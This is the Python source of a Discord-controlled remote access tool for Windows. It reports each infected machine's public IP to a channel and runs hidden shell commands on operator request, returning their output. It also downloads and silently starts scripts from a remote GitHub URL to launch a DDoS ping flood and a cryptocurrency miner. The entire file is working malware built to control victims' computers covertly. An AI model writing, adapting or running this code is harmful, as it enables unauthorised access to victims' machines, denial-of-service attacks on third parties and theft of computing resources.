import os
import shutil
import pathlib
import discord
import requests
import subprocess
from pathlib import *
from tendo import singleton
from discord.ext import commands
from discord import app_commands

token = '' #Token
channel_id =  #ChannelID

# single proccess
me = singleton.SingleInstance()

# bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command('help')
drive = pathlib.Path.home().drive
temp = os.getenv('temp')
ip = requests.get('https://api.ipify.org').text.strip()
file_name = os.path.basename(__file__)

def exec_cmd(fname):
    subprocess.run(fname.split(), shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags = subprocess.CREATE_NO_WINDOW)

# cd temp
os.chdir(temp)

# log
@bot.event
async def on_ready():
    print(f'{bot.user}')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=ip))
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[+] {ip}: Session opened``")


# bot commands

# sessions
@bot.command()
async def sessions(ctx):
    await ctx.send(f"``--> {ip}``")

# kill
@bot.command()
async def kill(ctx):
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[-] {ip}: Session closed``")
    os._exit
    exec_cmd(f'taskkill /F /IM {file_name} /T')

# shell
@bot.command()
async def shell(ctx, *args):
    arguments = ' '.join(args)
    exec_cmd(f'{arguments}')
    await ctx.send(f"``[+] {ip}: Command executed``")

# ddos
@bot.command()
async def ddos(ctx):
    url = "https://github.com/rxu7s/Public/raw/main/SlientPing.cmd"
    response = requests.get(url)
    open("SlientPing.cmd", "wb").write(response.content)
    exec_cmd("taskkill /F /IM ping.exe /T")
    exec_cmd("start /min SlientPing.cmd")
    await ctx.send(f"``[+] {ip}: Ddos attack started``")

# stop ddos
@bot.command()
async def stopddos(ctx):
    exec_cmd("taskkill /F /IM ping.exe /T")
    await ctx.send(f"``[-] {ip}: Ddos attack stoped``")

# miner
@bot.command()
async def miner(ctx):
    url = "https://github.com/rxu7s/Public/raw/main/SlientMiner.cmd"
    response = requests.get(url)
    open("SlientMiner.cmd", "wb").write(response.content)
    exec_cmd("taskkill /F /IM hellminer.exe /T")
    exec_cmd("start /min SlientMiner.cmd")
    await ctx.send(f"``[+] {ip}: Miner started``")

# stop miner
@bot.command()
async def stopminer(ctx):
    exec_cmd("taskkill /F /IM hellminer.exe /T")
    await ctx.send(f"``[-] {ip}: Miner stoped``")


# self commands

# kill
@bot.command(name="kill." + ip)
async def selfkill(ctx):
    channel = bot.get_channel(channel_id)
    await channel.send(f"``[-] {ip}: Session closed``")
    exit()
    exec_cmd(f'taskkill /F /IM {file_name} /T')

# shell
@bot.command(name="shell." + ip)
async def selfshell(ctx, *args):
    arguments = ' '.join(args)
    exec_cmd(f'{arguments} > output.txt')
    await ctx.send(file=discord.File(r'output.txt'))

# ddos
@bot.command(name="ddos." + ip)
async def ddos(ctx):
    url = "https://github.com/rxu7s/Public/raw/main/SlientPing.cmd"
    response = requests.get(url)
    open("SlientPing.cmd", "wb").write(response.content)
    exec_cmd("taskkill /F /IM ping.exe /T")
    exec_cmd("start /min SlientPing.cmd")
    await ctx.send(f"``[+] {ip}: Ddos attack started``")

# stop ddos
@bot.command(name="stopddos." + ip)
async def stopddos(ctx):
    exec_cmd("taskkill /F /IM ping.exe /T")
    await ctx.send(f"``[-] {ip}: Ddos attack stoped``")

# miner
@bot.command(name="miner." + ip)
async def miner(ctx):
    url = "https://github.com/rxu7s/Public/raw/main/SlientMiner.cmd"
    response = requests.get(url)
    open("SlientMiner.cmd", "wb").write(response.content)
    exec_cmd("taskkill /F /IM hellminer.exe /T")
    exec_cmd("start /min SlientMiner.cmd")
    await ctx.send(f"``[+] {ip}: Miner started``")

# stop miner
@bot.command(name="stopminer." + ip)
async def stopminer(ctx):
    exec_cmd("taskkill /F /IM hellminer.exe /T")
    await ctx.send(f"``[-] {ip}: Miner stoped``")

bot.run(token)
